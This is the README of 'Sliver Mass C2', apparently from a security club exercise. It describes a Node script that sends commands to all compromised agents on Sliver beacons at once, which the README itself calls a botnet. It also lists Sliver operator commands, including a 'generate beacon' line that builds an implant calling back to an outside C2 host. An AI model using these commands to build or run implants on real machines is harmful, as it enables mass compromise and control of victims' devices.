# Sliver Mass C2
This short script allows you to **Command and Control** ALL agents on a beacon (or multiple beacons)! <br> <br>

To run, just clone this folder, install the `Node` dependencies, modify `sliver.mjs` with configs, and run the file!

```bash
npm install
node sliver.mjs
```

## NPM Dependencies
* <a href="https://github.com/moloch--/sliver-script">Sliver Script</a> - Don't worry, BishopFox officially supports this library in their documentation
* If you don't like Sliver Script, this also works for <a href="https://github.com/moloch--/sliver-py">Sliver-Py</a>

## Why Sliver Mass C2?
As we kind of saw in SCDT, the Sliver interface only allows you to **Command and Control** ONE agent/victim at a time. <br>
`sliver.mjs` fixes that. By running the script, your C2 Server can command *multiple* devices. We also call this a botnet.

## Some Nifty Commands when playing with Sliver:
* `use` - Select an agent to interact with
* `beacons` - Check all the beacons that are currently active, and the agents periodically checking into the beacon
* `beacons prune` - Remove all expired beacons
* `beacons -K` - Shuts down all beacons (if the botnet grows out of control)
* `tasks` - Checks the completed and pending tasks in a beacon
* `generate` - Generate an implant (read: malware that connects to the C2 server)
    * ie: `generate beacon --mtls c2.scdt.club:443 --save ./sliver_c2_beacon --os linux`